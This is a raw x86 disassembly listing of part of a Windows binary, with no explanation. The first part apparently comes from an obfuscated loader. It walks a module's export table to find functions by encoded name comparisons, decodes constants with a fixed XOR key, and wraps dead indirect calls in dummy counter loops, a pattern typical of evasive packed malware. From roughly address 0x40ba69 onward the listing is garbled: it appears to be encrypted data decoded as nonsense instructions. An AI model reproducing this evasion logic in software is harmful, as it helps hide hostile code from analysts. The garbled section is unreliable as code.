  40b1c7:	sub    ebx,edi
  40b1c9:	add    DWORD PTR [eax],ebx
  40b1cb:	jmp    0x40b1d6
  40b1d0:	xor    edi,ecx
  40b1d2:	add    edi,edx
  40b1d4:	add    DWORD PTR [eax],edi
  40b1d6:	mov    eax,DWORD PTR [ebp-0x8]
  40b1d9:	mov    edi,DWORD PTR [ebp-0x10]
  40b1dc:	mov    eax,DWORD PTR [eax]
  40b1de:	xor    edi,ecx
  40b1e0:	add    edi,0x3272d8
  40b1e6:	not    edi
  40b1e8:	and    eax,edi
  40b1ea:	movsx  di,BYTE PTR [eax+0x1]
  40b1ef:	mov    ebx,0x3b4a
  40b1f4:	sub    di,bx
  40b1f7:	mov    ebx,0x8a84
  40b1fc:	xor    di,bx
  40b1ff:	mov    ebx,0x4f94
  40b204:	cmp    di,bx
  40b207:	jne    0x40b22f
  40b20d:	movsx  di,BYTE PTR [eax]
  40b211:	mov    ebx,0x3b4a
  40b216:	sub    di,bx
  40b219:	mov    ebx,0x8a84
  40b21e:	xor    di,bx
  40b221:	mov    ebx,0x4f87
  40b226:	cmp    di,bx
  40b229:	je     0x40b23f
  40b22f:	mov    edi,DWORD PTR [ebp-0x10]
  40b232:	xor    edi,ecx
  40b234:	mov    ebx,esi
  40b236:	sub    ebx,edi
  40b238:	add    eax,ebx
  40b23a:	jmp    0x40b1ea
  40b23f:	mov    esi,DWORD PTR [ebp-0x14]
  40b242:	mov    esi,DWORD PTR [esi]
  40b244:	mov    edi,DWORD PTR [eax+0x3c]
  40b247:	lea    esi,[edi+esi*8+0x78]
  40b24b:	mov    esi,DWORD PTR [esi+eax*1]
  40b24e:	mov    DWORD PTR [ebp-0x8],esi
  40b251:	mov    esi,DWORD PTR [ebp+0x8]
  40b254:	xor    esi,ecx
  40b256:	add    esi,edx
  40b258:	mov    DWORD PTR [ebp-0x14],esi
  40b25b:	mov    esi,DWORD PTR [ebp+0x8]
  40b25e:	mov    edi,DWORD PTR [ebp-0x8]
  40b261:	xor    esi,ecx
  40b263:	add    esi,edx
  40b265:	pop    ebx
  40b266:	cmp    edi,esi
  40b268:	jne    0x40b286
  40b26e:	mov    eax,DWORD PTR [ebp+0xc]
  40b271:	xor    eax,ecx
  40b273:	mov    ecx,DWORD PTR [ebp-0x8]
  40b276:	add    eax,edx
  40b278:	imul   eax,ecx
  40b27b:	mov    DWORD PTR [ebp-0x8],eax
  40b27e:	push   DWORD PTR [ebp+0x18]
  40b281:	jmp    0x40b2da
  40b286:	mov    ecx,DWORD PTR [ebp-0x8]
  40b289:	add    ecx,eax
  40b28b:	mov    DWORD PTR [ebp-0x14],ecx
  40b28e:	mov    ecx,DWORD PTR [ebp-0x14]
  40b291:	mov    ecx,DWORD PTR [ecx+0xc]
  40b294:	movsx  cx,BYTE PTR [ecx+eax*1]
  40b299:	mov    edx,0x3b4a
  40b29e:	sub    cx,dx
  40b2a1:	mov    edx,0x8a84
  40b2a6:	xor    cx,dx
  40b2a9:	mov    edx,0x4f85
  40b2ae:	cmp    cx,dx
  40b2b1:	jne    0x40b27e
  40b2b7:	mov    ecx,DWORD PTR ds:0x41c553
  40b2bd:	mov    ecx,DWORD PTR [ecx+0x198]
  40b2c3:	mov    DWORD PTR [ecx],eax
  40b2c5:	jmp    0x40b2eb
  40b2ca:	mov    ecx,DWORD PTR [ebp+0x18]
  40b2cd:	cmp    ecx,0xf89c85b9
  40b2d3:	jne    0x40b2eb
  40b2d9:	push   eax
  40b2da:	push   DWORD PTR [ebp+0x14]
  40b2dd:	push   DWORD PTR [ebp+0x10]
  40b2e0:	push   DWORD PTR [ebp+0xc]
  40b2e3:	push   DWORD PTR [ebp+0x8]
  40b2e6:	call   0x4066e9
  40b2eb:	pop    edi
  40b2ec:	pop    esi
  40b2ed:	leave  
  40b2ee:	ret    0x14
  40b2f1:	push   ebp
  40b2f2:	mov    ebp,esp
  40b2f4:	push   ecx
  40b2f5:	mov    edx,DWORD PTR ds:0x41c353
  40b2fb:	mov    eax,ds:0x41c383
  40b300:	sub    eax,edx
  40b302:	xor    edx,DWORD PTR [edx+eax*1]
  40b305:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  40b30c:	mov    eax,DWORD PTR [ebp-0x4]
  40b30f:	mov    DWORD PTR ds:0x42e014,0x16
  40b319:	cmp    DWORD PTR ds:0x42e014,0x0
  40b320:	je     0x40b354
  40b326:	cmp    DWORD PTR ds:0x42e014,0x22
  40b32d:	jne    0x40b33c
  40b333:	push   DWORD PTR [ebp-0x20]
  40b336:	call   DWORD PTR ds:0x42a040
  40b33c:	mov    edx,DWORD PTR ds:0x42e014
  40b342:	dec    edx
  40b343:	mov    DWORD PTR ds:0x42e014,edx
  40b349:	jmp    0x40b319
  40b34e:	sbb    DWORD PTR ds:0x430010,edx
  40b354:	mov    edx,DWORD PTR [ebp+0x10]
  40b357:	sbb    DWORD PTR ds:0x43001c,0x42f018
  40b361:	mov    ecx,0x7510891
  40b366:	xor    eax,ecx
  40b368:	add    eax,0x3272d9
  40b36d:	mov    DWORD PTR [edx],eax
  40b36f:	sbb    DWORD PTR ds:0x431014,ebx
  40b375:	mov    eax,DWORD PTR [ebp+0xc]
  40b378:	and    DWORD PTR ds:0x42e008,0x0
  40b382:	jmp    0x40b394
  40b387:	mov    edx,DWORD PTR ds:0x42e008
  40b38d:	inc    edx
  40b38e:	mov    DWORD PTR ds:0x42e008,edx
  40b394:	cmp    DWORD PTR ds:0x42e008,0x1d
  40b39b:	jae    0x40b3ea
  40b3a1:	cmp    DWORD PTR ds:0x42e008,0x11
  40b3a8:	jne    0x40b3c9
  40b3ae:	push   DWORD PTR [ebp-0x10]
  40b3b1:	push   0x55db
  40b3b6:	push   0x79e9
  40b3bb:	push   0x753c
  40b3c0:	push   DWORD PTR [ebp-0x1c]
  40b3c3:	call   DWORD PTR ds:0x42a044
  40b3c9:	cmp    DWORD PTR ds:0x42e008,0x10
  40b3d0:	jne    0x40b3e5
  40b3d6:	xor    edx,edx
  40b3d8:	or     edx,DWORD PTR ds:0x42e008
  40b3de:	inc    edx
  40b3df:	mov    DWORD PTR ds:0x42e008,edx
  40b3e5:	jmp    0x40b387
  40b3ea:	xor    eax,ecx
  40b3ec:	push   esi
  40b3ed:	mov    esi,DWORD PTR [ebp+0x10]
  40b3f0:	mov    edx,0x3272d9
  40b3f5:	add    eax,edx
  40b3f7:	mov    DWORD PTR [esi+0x4],eax
  40b3fa:	mov    eax,DWORD PTR [ebp+0x14]
  40b3fd:	mov    esi,DWORD PTR [ebp+0x10]
  40b400:	mov    DWORD PTR [esi+0x8],eax
  40b403:	mov    eax,DWORD PTR [ebp+0x18]
  40b406:	mov    esi,DWORD PTR [ebp+0x10]
  40b409:	mov    DWORD PTR [esi+0xc],eax
  40b40c:	mov    eax,DWORD PTR [ebp+0x1c]
  40b40f:	mov    esi,DWORD PTR [ebp+0x10]
  40b412:	mov    DWORD PTR [esi+0x10],eax
  40b415:	mov    eax,DWORD PTR [ebp+0x8]
  40b418:	xor    eax,ecx
  40b41a:	add    eax,edx
  40b41c:	pop    esi
  40b41d:	leave  
  40b41e:	ret    0x18
  40b421:	push   ebp
  40b422:	mov    ebp,esp
  40b424:	sub    esp,0x94
  40b42a:	sub    ecx,DWORD PTR ds:0x42f004
  40b430:	mov    eax,DWORD PTR [ebp+0x8]
  40b433:	sbb    ecx,DWORD PTR ds:0x431014
  40b439:	push   ebx
  40b43a:	push   esi
  40b43b:	push   edi
  40b43c:	movzx  edi,BYTE PTR ds:0x42e004
  40b443:	sbb    DWORD PTR ds:0x432010,edi
  40b449:	mov    esi,0x7510891
  40b44e:	xor    eax,esi
  40b450:	xor    edi,edi
  40b452:	mov    edi,0x3272d9
  40b457:	xor    ecx,DWORD PTR ds:0x42e014
  40b45d:	add    eax,edi
  40b45f:	and    DWORD PTR ds:0x431004,0x0
  40b469:	mov    ecx,DWORD PTR ds:0x431004
  40b46f:	inc    ecx
  40b470:	mov    DWORD PTR ds:0x431004,ecx
  40b476:	cmp    DWORD PTR ds:0x431004,0x1a
  40b47d:	jne    0x40b48e
  40b483:	push   0x6e06
  40b488:	call   DWORD PTR ds:0x42a018
  40b48e:	cmp    DWORD PTR ds:0x431004,0x10
  40b495:	jb     0x40b469
  40b49b:	mov    DWORD PTR ds:0x43101c,0x13
  40b4a5:	cmp    DWORD PTR ds:0x43101c,0x0
  40b4ac:	je     0x40b4f5
  40b4b2:	cmp    DWORD PTR ds:0x43101c,0x1f
  40b4b9:	jne    0x40b4dd
  40b4bf:	push   0x423927
  40b4c4:	push   DWORD PTR [ebp-0x18]
  40b4c7:	push   0x60dc
  40b4cc:	push   0x4058
  40b4d1:	push   DWORD PTR [ebp-0x24]
  40b4d4:	push   DWORD PTR [ebp-0x14]
  40b4d7:	call   DWORD PTR ds:0x42a01c
  40b4dd:	mov    ecx,DWORD PTR ds:0x43101c
  40b4e3:	dec    ecx
  40b4e4:	mov    DWORD PTR ds:0x43101c,ecx
  40b4ea:	jmp    0x40b4a5
  40b4ef:	and    DWORD PTR ds:0x43000c,edx
  40b4f5:	mov    DWORD PTR [ebp-0x38],eax
  40b4f8:	mov    eax,ds:0x41c3d3
  40b4fd:	add    DWORD PTR ds:0x42f01c,0x42f014
  40b507:	mov    eax,DWORD PTR [eax]
  40b509:	mov    DWORD PTR ds:0x430004,0x15
  40b513:	cmp    DWORD PTR ds:0x430004,0x0
  40b51a:	je     0x40b567
  40b520:	cmp    DWORD PTR ds:0x430004,0x5
  40b527:	jne    0x40b53b
  40b52d:	push   0x4238c9
  40b532:	push   DWORD PTR [ebp-0x1c]
  40b535:	call   DWORD PTR ds:0x42a020
  40b53b:	cmp    DWORD PTR ds:0x430004,0x6
  40b542:	jne    0x40b555
  40b548:	mov    ecx,DWORD PTR ds:0x430004
  40b54e:	dec    ecx
  40b54f:	mov    DWORD PTR ds:0x430004,ecx
  40b555:	mov    ecx,DWORD PTR ds:0x430004
  40b55b:	dec    ecx
  40b55c:	mov    DWORD PTR ds:0x430004,ecx
  40b562:	jmp    0x40b513
  40b567:	mov    DWORD PTR [ebp-0x24],eax
  40b56a:	mov    DWORD PTR ds:0x430014,0x1e
  40b574:	cmp    DWORD PTR ds:0x430014,0x0
  40b57b:	je     0x40b5d1
  40b581:	cmp    DWORD PTR ds:0x430014,0x2
  40b588:	jne    0x40b5a3
  40b58e:	push   0x3b6e
  40b593:	push   0x42f008
  40b598:	push   0x5fc2
  40b59d:	call   DWORD PTR ds:0x42a024
  40b5a3:	cmp    DWORD PTR ds:0x430014,0x3
  40b5aa:	jne    0x40b5bd
  40b5b0:	mov    ecx,DWORD PTR ds:0x430014
  40b5b6:	dec    ecx
  40b5b7:	mov    DWORD PTR ds:0x430014,ecx
  40b5bd:	xor    ecx,ecx
  40b5bf:	xor    ecx,DWORD PTR ds:0x430014
  40b5c5:	dec    ecx
  40b5c6:	mov    DWORD PTR ds:0x430014,ecx
  40b5cc:	jmp    0x40b574
  40b5d1:	mov    eax,ds:0x41c5db
  40b5d6:	mov    eax,DWORD PTR [eax]
  40b5d8:	and    DWORD PTR ds:0x42e014,0x0
  40b5e2:	jmp    0x40b5f6
  40b5e7:	xor    ecx,ecx
  40b5e9:	or     ecx,DWORD PTR ds:0x42e014
  40b5ef:	inc    ecx
  40b5f0:	mov    DWORD PTR ds:0x42e014,ecx
  40b5f6:	cmp    DWORD PTR ds:0x42e014,0x1a
  40b5fd:	jae    0x40b63a
  40b603:	cmp    DWORD PTR ds:0x42e014,0x5
  40b60a:	jne    0x40b61b
  40b610:	push   0x423961
  40b615:	call   DWORD PTR ds:0x42a028
  40b61b:	cmp    DWORD PTR ds:0x42e014,0x4
  40b622:	jne    0x40b635
  40b628:	mov    ecx,DWORD PTR ds:0x42e014
  40b62e:	inc    ecx
  40b62f:	mov    DWORD PTR ds:0x42e014,ecx
  40b635:	jmp    0x40b5e7
  40b63a:	mov    DWORD PTR [ebp-0x28],eax
  40b63d:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  40b644:	mov    eax,DWORD PTR [ebp-0x34]
  40b647:	xor    eax,esi
  40b649:	add    eax,edi
  40b64b:	add    DWORD PTR ds:0x431000,edi
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	mov    eax,ds:0x41c553
  40b659:	adc    ecx,DWORD PTR ds:0x431000
  40b65f:	mov    DWORD PTR [ebp-0x38],eax
  40b662:	mov    eax,DWORD PTR [ebp-0x24]
  40b665:	and    DWORD PTR ds:0x42e00c,0x0
  40b66f:	xor    ecx,ecx
  40b671:	xor    ecx,DWORD PTR ds:0x42e00c
  40b677:	inc    ecx
  40b678:	mov    DWORD PTR ds:0x42e00c,ecx
  40b67e:	cmp    DWORD PTR ds:0x42e00c,0x1e
  40b685:	jne    0x40b69b
  40b68b:	push   0x42e024
  40b690:	push   0x7afc
  40b695:	call   DWORD PTR ds:0x42a02c
  40b69b:	cmp    DWORD PTR ds:0x42e00c,0x11
  40b6a2:	jb     0x40b66f
  40b6a8:	and    DWORD PTR ds:0x42f014,0x0
  40b6b2:	jmp    0x40b6c4
  40b6b7:	mov    ecx,DWORD PTR ds:0x42f014
  40b6bd:	inc    ecx
  40b6be:	mov    DWORD PTR ds:0x42f014,ecx
  40b6c4:	cmp    DWORD PTR ds:0x42f014,0x1d
  40b6cb:	jae    0x40b6f6
  40b6d1:	cmp    DWORD PTR ds:0x42f014,0x2b
  40b6d8:	jne    0x40b6e7
  40b6de:	push   DWORD PTR [ebp-0x10]
  40b6e1:	call   DWORD PTR ds:0x42a030
  40b6e7:	jmp    0x40b6b7
  40b6ec:	xor    DWORD PTR ds:0x430014,0x6be2
  40b6f6:	mov    DWORD PTR [ebp-0x14],eax
  40b6f9:	and    DWORD PTR ds:0x42f010,0x0
  40b703:	mov    eax,ds:0x42f010
  40b708:	inc    eax
  40b709:	mov    ds:0x42f010,eax
  40b70e:	cmp    DWORD PTR ds:0x42f010,0x2a
  40b715:	jne    0x40b724
  40b71b:	push   DWORD PTR [ebp-0x24]
  40b71e:	call   DWORD PTR ds:0x42a034
  40b724:	cmp    DWORD PTR ds:0x42f010,0x1b
  40b72b:	jb     0x40b703
  40b731:	mov    eax,DWORD PTR [ebp-0x14]
  40b734:	mov    DWORD PTR ds:0x431000,0x1e
  40b73e:	cmp    DWORD PTR ds:0x431000,0x0
  40b745:	je     0x40b777
  40b74b:	cmp    DWORD PTR ds:0x431000,0x27
  40b752:	jne    0x40b763
  40b758:	push   0x432014
  40b75d:	call   DWORD PTR ds:0x42a038
  40b763:	xor    ecx,ecx
  40b765:	add    ecx,DWORD PTR ds:0x431000
  40b76b:	dec    ecx
  40b76c:	mov    DWORD PTR ds:0x431000,ecx
  40b772:	jmp    0x40b73e
  40b777:	push   0x4
  40b779:	xor    DWORD PTR ds:0x430000,0xd87
  40b783:	pop    ecx
  40b784:	sub    ecx,eax
  40b786:	movzx  eax,WORD PTR ds:0x42f000
  40b78d:	sbb    DWORD PTR ds:0x42e008,eax
  40b793:	add    ecx,DWORD PTR [ebp-0x28]
  40b796:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  40b79d:	mov    DWORD PTR [ebp-0x20],ecx
  40b7a0:	sbb    DWORD PTR ds:0x430014,0x44f2
  40b7aa:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  40b7b4:	sub    DWORD PTR ds:0x42f004,ecx
  40b7ba:	mov    eax,DWORD PTR [ebp-0x14]
  40b7bd:	and    DWORD PTR ds:0x432008,0x427a
  40b7c7:	mov    DWORD PTR [ebp-0x90],eax
  40b7cd:	adc    eax,DWORD PTR ds:0x431004
  40b7d3:	mov    eax,DWORD PTR [ebp-0x20]
  40b7d6:	mov    DWORD PTR [ebp-0x8c],eax
  40b7dc:	xor    eax,eax
  40b7de:	add    eax,DWORD PTR ds:0x430018
  40b7e4:	adc    DWORD PTR ds:0x432008,eax
  40b7ea:	mov    eax,DWORD PTR [ebp-0x2c]
  40b7ed:	xor    eax,esi
  40b7ef:	sub    DWORD PTR ds:0x42f00c,0x42f014
  40b7f9:	add    eax,edi
  40b7fb:	adc    DWORD PTR ds:0x42e014,0x42e004
  40b805:	mov    DWORD PTR [ebp-0x88],eax
  40b80b:	lea    eax,[ebp-0x50]
  40b80e:	sub    DWORD PTR ds:0x43201c,0x7b1e
  40b818:	mov    DWORD PTR [ebp-0x84],eax
  40b81e:	mov    eax,DWORD PTR [ebp-0x94]
  40b824:	sub    DWORD PTR ds:0x43100c,0x3356
  40b82e:	xor    eax,esi
  40b830:	neg    DWORD PTR ds:0x43201c
  40b836:	add    eax,edi
  40b838:	and    DWORD PTR ds:0x431004,0x42f008
  40b842:	mov    DWORD PTR [ebp-0x94],eax
  40b848:	and    DWORD PTR ds:0x430000,0x432004
  40b852:	lea    eax,[ebp-0x94]
  40b858:	adc    DWORD PTR ds:0x42e01c,0x2699
  40b862:	push   eax
  40b863:	and    DWORD PTR ds:0x42e004,0x0
  40b86d:	jmp    0x40b87d
  40b872:	mov    eax,ds:0x42e004
  40b877:	inc    eax
  40b878:	mov    ds:0x42e004,eax
  40b87d:	cmp    DWORD PTR ds:0x42e004,0x14
  40b884:	jae    0x40b8b5
  40b88a:	cmp    DWORD PTR ds:0x42e004,0x15
  40b891:	jne    0x40b8aa
  40b897:	push   0x2be1
  40b89c:	push   DWORD PTR [ebp-0x24]
  40b89f:	push   0x1841
  40b8a4:	call   DWORD PTR ds:0x42a03c
  40b8aa:	jmp    0x40b872
  40b8af:	add    eax,DWORD PTR ds:0x430000
  40b8b5:	mov    eax,DWORD PTR [ebp+0xc]
  40b8b8:	xor    eax,esi
  40b8ba:	add    eax,edi
  40b8bc:	sbb    DWORD PTR ds:0x42e024,0x43200c
  40b8c6:	push   eax
  40b8c7:	xor    DWORD PTR ds:0x432010,0x3fd0
  40b8d1:	mov    eax,ds:0x41c573
  40b8d6:	push   0x41c4c9
  40b8db:	push   DWORD PTR [eax]
  40b8dd:	dec    DWORD PTR ds:0x42e014
  40b8e3:	call   0x4038a9
  40b8e8:	xor    ecx,DWORD PTR ds:0x430014
  40b8ee:	mov    eax,DWORD PTR [ebp-0x14]
  40b8f1:	mov    ecx,DWORD PTR ds:0x430014
  40b8f7:	and    DWORD PTR ds:0x43101c,ecx
  40b8fd:	mov    ecx,DWORD PTR [ebp-0x20]
  40b900:	mov    DWORD PTR [ebp-0x44],ecx
  40b903:	inc    DWORD PTR ds:0x42e020
  40b909:	mov    ecx,DWORD PTR [ebp+0x8]
  40b90c:	add    DWORD PTR ds:0x42f004,0x43001c
  40b916:	xor    ecx,esi
  40b918:	sbb    DWORD PTR ds:0x42f01c,0x3b17
  40b922:	mov    DWORD PTR [ebp-0x34],eax
  40b925:	adc    DWORD PTR ds:0x431010,0x39ba
  40b92f:	add    ecx,edi
  40b931:	mov    DWORD PTR ds:0x430004,0x6692
  40b93b:	jmp    0x40dfd9
  40b940:	xor    DWORD PTR ds:0x42e024,ecx
  40b946:	lea    edx,[ecx+eax*1]
  40b949:	mov    DWORD PTR [ebp-0x28],edx
  40b94c:	mov    DWORD PTR ds:0x432008,0x16
  40b956:	cmp    DWORD PTR ds:0x432008,0x0
  40b95d:	je     0x40b9f2
  40b963:	cmp    DWORD PTR ds:0x432008,0x24
  40b96a:	jne    0x40b979
  40b970:	push   DWORD PTR [ebp-0x1c]
  40b973:	call   DWORD PTR ds:0x42a040
  40b979:	mov    edx,DWORD PTR ds:0x432008
  40b97f:	dec    edx
  40b980:	mov    DWORD PTR ds:0x432008,edx
  40b986:	jmp    0x40b956
  40b98b:	mov    DWORD PTR ds:0x43000c,0x1d
  40b995:	cmp    DWORD PTR ds:0x43000c,0x0
  40b99c:	je     0x40b9f2
  40b9a2:	cmp    DWORD PTR ds:0x43000c,0x5
  40b9a9:	jne    0x40b9c6
  40b9af:	push   0x12e5
  40b9b4:	push   DWORD PTR [ebp-0x14]
  40b9b7:	push   DWORD PTR [ebp-0x14]
  40b9ba:	push   DWORD PTR [ebp-0x28]
  40b9bd:	push   DWORD PTR [ebp-0xc]
  40b9c0:	call   DWORD PTR ds:0x42a044
  40b9c6:	cmp    DWORD PTR ds:0x43000c,0x6
  40b9cd:	jne    0x40b9e0
  40b9d3:	mov    ebx,DWORD PTR ds:0x43000c
  40b9d9:	dec    ebx
  40b9da:	mov    DWORD PTR ds:0x43000c,ebx
  40b9e0:	mov    ebx,DWORD PTR ds:0x43000c
  40b9e6:	dec    ebx
  40b9e7:	mov    DWORD PTR ds:0x43000c,ebx
  40b9ed:	jmp    0x40b995
  40b9f2:	mov    edx,DWORD PTR [ebp-0x44]
  40b9f5:	sub    edx,ecx
  40b9f7:	mov    DWORD PTR [ebp-0x24],edx
  40b9fa:	mov    edx,DWORD PTR [ebp-0x24]
  40b9fd:	mov    DWORD PTR [ebp-0x14],edx
  40ba00:	mov    edx,DWORD PTR [ebp-0x28]
  40ba03:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  40ba0a:	mov    DWORD PTR [ebp-0x40],edx
  40ba0d:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  40ba14:	mov    edx,DWORD PTR [ebp-0x3c]
  40ba17:	xor    edx,esi
  40ba19:	add    edx,edi
  40ba1b:	mov    DWORD PTR [ebp-0x10],edx
  40ba1e:	mov    edx,DWORD PTR [ebp-0x3c]
  40ba21:	xor    edx,esi
  40ba23:	add    edx,edi
  40ba25:	mov    DWORD PTR [ebp-0x8],edx
  40ba28:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  40ba2f:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  40ba36:	mov    edx,DWORD PTR [ebp-0x3c]
  40ba39:	mov    ebx,DWORD PTR [ebp-0x14]
  40ba3c:	xor    edx,esi
  40ba3e:	add    edx,edi
  40ba40:	cmp    ebx,edx
  40ba42:	je     0x40dfcd
  40ba48:	mov    eax,DWORD PTR [ebp-0x18]
  40ba4b:	xor    eax,esi
  40ba4d:	mov    edx,0xffcd8d27
  40ba52:	sub    edx,eax
  40ba54:	add    edx,DWORD PTR [ebp-0x14]
  40ba57:	mov    eax,DWORD PTR [ebp-0x18]
  40ba5a:	mov    ebx,DWORD PTR [ebp-0x10]
  40ba5d:	xor    eax,esi
  40ba5f:	add    eax,edi
  40ba61:	imul   eax,ebx
  40ba64:	jmp    0x40de0d
  40ba69:	je     0x40ba9a
  40ba6b:	mov    ebx,0x356263f6
  40ba70:	stos   DWORD PTR es:[edi],eax
  40ba71:	lea    edi,[edi-0x56cb710e]
  40ba77:	xchg   edi,eax
  40ba78:	inc    ebp
  40ba79:	or     eax,0xf46060f5
  40ba7e:	pop    edi
  40ba7f:	pusha  
  40ba80:	pusha  
  40ba81:	pop    ds
  40ba82:	inc    ebx
  40ba83:	mov    bl,0xc7
  40ba85:	add    DWORD PTR [edx+0x55],edx
  40ba88:	lods   eax,DWORD PTR ds:[esi]
  40ba89:	push   cs
  40ba8a:	shl    BYTE PTR [ebx+0x5a2771a3],1
  40ba90:	mov    DWORD PTR [ebx-0x6],ebp
  40ba93:	mov    eax,ds:0x152d96b1
  40ba98:	lahf   
  40ba99:	aam    0xc5
  40ba9b:	adc    esi,DWORD PTR [ebp-0x32]
  40ba9e:	fmul   DWORD PTR [esp+ecx*2-0x28]
  40baa2:	int3   
  40baa3:	scas   al,BYTE PTR es:[edi]
  40baa4:	mov    ebp,0xe1e60d87
  40baa9:	jne    0x40bb1d
  40baab:	jecxz  0x40ba40
  40baad:	push   edx
  40baae:	nop
  40baaf:	cwde   
  40bab0:	pop    ss
  40bab1:	cmp    eax,0xad4ebc9e
  40bab6:	lods   eax,DWORD PTR ds:[esi]
  40bab7:	stc    
  40bab8:	xlat   BYTE PTR ds:[ebx]
  40bab9:	cmp    al,0xd3
  40babb:	add    BYTE PTR [ebp+0xbada5db],ch
  40bac1:	lods   eax,DWORD PTR ds:[esi]
  40bac2:	pop    ecx
  40bac3:	(bad)  
  40bac4:	mov    esi,0x8aa09868
  40bac9:	call   0x5ffe:0xc50ad113
  40bad0:	test   al,0x70
  40bad2:	test   DWORD PTR [esi-0x34],edi
  40bad5:	jae    0x40ba6a
  40bad7:	ret    
  40bad8:	retf   0xacfd
  40badb:	mov    eax,0x2fd819f8
  40bae0:	fcmovnb st,st(6)
  40bae2:	push   ebp
  40bae3:	sub    BYTE PTR [ebp-0x11],dh
  40bae6:	push   edi
  40bae7:	inc    ecx
  40bae8:	jno    0x40bb14
  40baea:	adc    eax,0x1770e90a
  40baef:	dec    BYTE PTR [edx+0x5f14fbd]
  40baf5:	dec    edx
  40baf6:	and    bh,BYTE PTR [ebp+0x7ec240c9]
  40bafc:	in     al,0xd8
  40bafe:	pop    ebx
  40baff:	xor    bl,al
  40bb01:	mov    al,ds:0xbd238734
  40bb06:	inc    ebx
  40bb07:	jmp    0x747d:0xa8c54808
  40bb0e:	cmp    DWORD PTR [ecx-0x22f01a1d],edx
  40bb14:	sar    DWORD PTR [edx-0x5ef9869],0x83
  40bb1b:	xor    BYTE PTR [ecx+0x16],ch
  40bb1e:	outs   dx,DWORD PTR ds:[esi]
  40bb1f:	jmp    0xb2e0354f
  40bb24:	stos   BYTE PTR es:[edi],al
  40bb25:	or     eax,0xb268b944
  40bb2a:	ins    BYTE PTR es:[edi],dx
  40bb2b:	dec    esp
  40bb2c:	mov    dl,0xa8
  40bb2e:	push   ds
  40bb2f:	adc    al,0xa5
  40bb31:	jns    0x40bb92
  40bb33:	xlat   BYTE PTR ds:[ebx]
  40bb34:	out    0x21,al
  40bb36:	aam    0xeb
  40bb38:	jmp    0x8a5a:0x1e7bac68
  40bb3f:	fnstenv [eax-0x68]
  40bb42:	lods   al,BYTE PTR ds:[esi]
  40bb43:	outs   dx,BYTE PTR ds:[esi]
  40bb44:	dec    edx
  40bb45:	fiadd  DWORD PTR [esi+0x79399847]
  40bb4b:	lods   al,BYTE PTR ds:[esi]
  40bb4c:	push   ebp
  40bb4d:	out    0x17,al
  40bb4f:	push   ebx
  40bb50:	data16 sub dh,BYTE PTR [eax+eiz*1]
  40bb54:	in     al,dx
  40bb55:	add    DWORD PTR [edi+0x342f7979],edi
  40bb5b:	(bad)  
  40bb5d:	mov    al,0xdf
  40bb5f:	data16 add al,0x6d
  40bb62:	enter  0xd099,0x8e
  40bb66:	repz sub eax,0x9e037efc
  40bb6c:	ret    
  40bb6d:	cmp    bl,ch
  40bb6f:	in     eax,0xc8
  40bb71:	je     0x40bb50
  40bb73:	mov    ebp,0x1a0ce03b
  40bb78:	jmp    0x40bbf8
  40bb7a:	or     DWORD PTR [edi-0x49],0x344fa35b
  40bb81:	dec    edx
  40bb82:	sahf   
  40bb83:	and    DWORD PTR [ebp-0x3a],eax
  40bb86:	sti    
  40bb87:	add    ah,BYTE PTR [edx+0x15998ac3]
  40bb8d:	xor    edx,DWORD PTR [edi+0x9]
  40bb90:	sahf   
  40bb91:	mov    bh,0xa3
  40bb93:	pop    eax
  40bb94:	scas   eax,DWORD PTR es:[edi]
  40bb95:	dec    eax
  40bb96:	cmp    DWORD PTR [edx+0x404cb340],ecx
  40bb9c:	jb     0x40bbd9
  40bb9e:	mov    ebx,0x48c39d84
  40bba3:	pop    esp
  40bba4:	push   cs
  40bba5:	push   eax
  40bba6:	pop    esp
  40bba7:	repz mov ds:0x8950e080,al
  40bbad:	out    dx,al
  40bbae:	stos   BYTE PTR es:[edi],al
  40bbaf:	fsubr  st(6),st
  40bbb1:	jecxz  0x40bb5e
  40bbb3:	xor    ecx,DWORD PTR [eax+ecx*4+0x75f39d25]
  40bbba:	and    eax,DWORD PTR [esi-0x2d]
  40bbbd:	in     eax,0xf5
  40bbbf:	xchg   ebp,eax
  40bbc0:	jg     0x40bb46
  40bbc2:	or     al,0xf5
  40bbc4:	jno    0x40bc02
  40bbc6:	cmp    BYTE PTR [edi-0x9f8687e],ch
  40bbcc:	rcr    cl,1
  40bbce:	sub    edi,DWORD PTR [ebx]
  40bbd0:	test   BYTE PTR [ecx-0x54259c6a],cl
  40bbd6:	sbb    al,0xd2
  40bbd8:	stos   BYTE PTR es:[edi],al
  40bbd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbda:	out    0xf5,eax
  40bbdc:	or     BYTE PTR [esi+0x7e],bl
  40bbdf:	xchg   esi,eax
  40bbe0:	pop    ebx
  40bbe1:	ins    BYTE PTR es:[edi],dx
  40bbe2:	jecxz  0x40bc13
  40bbe4:	int3   
  40bbe5:	xchg   esi,eax
  40bbe6:	(bad)  
  40bbe7:	aaa    
  40bbe8:	jle    0x40bc1a
  40bbea:	sub    bl,ch
  40bbec:	sbb    cl,BYTE PTR [edi-0x3f498e4c]
  40bbf2:	test   al,0xf2
  40bbf4:	dec    ebx
  40bbf5:	stc    
  40bbf6:	mov    ds:0x8856c65b,eax
  40bbfb:	ss jg  0x40bc54
  40bbfe:	stos   BYTE PTR es:[edi],al
  40bbff:	adc    cl,bl
  40bc01:	jbe    0x40bbf9
  40bc03:	cdq    
  40bc04:	fcmovbe st,st(4)
  40bc06:	pop    edx
  40bc07:	(bad)  
  40bc08:	int3   
  40bc09:	and    dh,ah
  40bc0b:	push   ebp
  40bc0c:	sub    DWORD PTR [eax+0x44],ecx
  40bc0f:	push   edx
  40bc10:	push   ds
  40bc11:	fnstenv [eax-0x747d1b38]
  40bc17:	xor    DWORD PTR [esi-0x4cc9a8f7],ebp
  40bc1d:	cld    
  40bc1e:	outs   dx,DWORD PTR ds:[esi]
  40bc1f:	push   esp
  40bc20:	push   cs
  40bc21:	add    eax,0xd8b4a6fd
  40bc26:	inc    esi
  40bc27:	mov    ebp,0xbc53dcbe
  40bc2c:	call   esi
